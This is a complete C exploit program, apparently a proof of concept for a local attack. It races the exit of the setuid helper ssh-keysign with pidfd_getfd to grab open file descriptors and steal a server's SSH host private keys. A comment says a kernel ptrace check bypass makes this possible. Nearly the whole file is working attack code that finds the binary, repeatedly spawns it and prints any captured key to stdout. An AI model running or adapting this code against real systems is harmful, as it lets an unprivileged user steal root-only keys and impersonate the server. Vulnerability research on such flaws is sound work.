/*
 * "It is a fearful thing to fall into the hands of the living God."
 *                                                — Hebrews 10:31
 *
 * ssh-keysign opens /etc/ssh/ssh_host_*_key before permanently_set_uid().
 * Bails out with the fds still open on EnableSSHKeysign=no. Race the
 * exit window with pidfd_getfd. mm-NULL bypasses the dumpable check
 * (kernel/ptrace.c, patched 31e62c2ebbfd 2026-05-14).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#ifndef __NR_pidfd_open
#define __NR_pidfd_open  434
#endif
#ifndef __NR_pidfd_getfd
#define __NR_pidfd_getfd 438
#endif

static int pidfd_open(pid_t pid, unsigned f)
{
	return syscall(__NR_pidfd_open, pid, f);
}

static int pidfd_getfd(int pfd, int fd, unsigned f)
{
	return syscall(__NR_pidfd_getfd, pfd, fd, f);
}

static const char *PATHS[] = {
	"/usr/libexec/ssh-keysign",
	"/usr/libexec/openssh/ssh-keysign",
	"/usr/lib/ssh/ssh-keysign",
	"/usr/lib/openssh/ssh-keysign",
	NULL,
};

int main(void)
{
	const char *bin = NULL;
	for (int i = 0; PATHS[i]; i++)
		if (access(PATHS[i], X_OK) == 0) { bin = PATHS[i]; break; }
	if (!bin) { fprintf(stderr, "ssh-keysign not found\n"); return 1; }
	fprintf(stderr, "uid=%d  target=%s\n", getuid(), bin);

	for (int round = 0; round < 500; round++) {
		pid_t c = fork();
		if (c == 0) {
			int dn = open("/dev/null", O_RDWR);
			dup2(dn, 0); dup2(dn, 1); dup2(dn, 2);
			execl(bin, "ssh-keysign", (char *)NULL);
			_exit(127);
		}

		int pfd = pidfd_open(c, 0);
		if (pfd < 0) { waitpid(c, NULL, 0); continue; }

		int hit = 0;
		for (int a = 0; a < 30000 && !hit; a++) {
			for (int i = 3; i < 32; i++) {
				int s = pidfd_getfd(pfd, i, 0);
				if (s < 0) continue;

				char p[256] = {0}, lk[64];
				snprintf(lk, sizeof(lk), "/proc/self/fd/%d", s);
				ssize_t n = readlink(lk, p, sizeof(p) - 1);
				if (n > 0) p[n] = 0;

				if (strstr(p, "ssh_host_") && strstr(p, "_key")) {
					fprintf(stderr, "fd %d -> %s (round=%d try=%d)\n", i, p, round, a);
					char buf[4096];
					lseek(s, 0, SEEK_SET);
					ssize_t k = read(s, buf, sizeof(buf) - 1);
					if (k > 0) { buf[k] = 0; fputs(buf, stdout); }
					close(s);
					hit = 1;
					break;
				}
				close(s);
			}
		}

		close(pfd);
		waitpid(c, NULL, 0);
		if (hit) return 0;
	}

	fprintf(stderr, "no hit in 500 rounds\n");
	return 1;
}
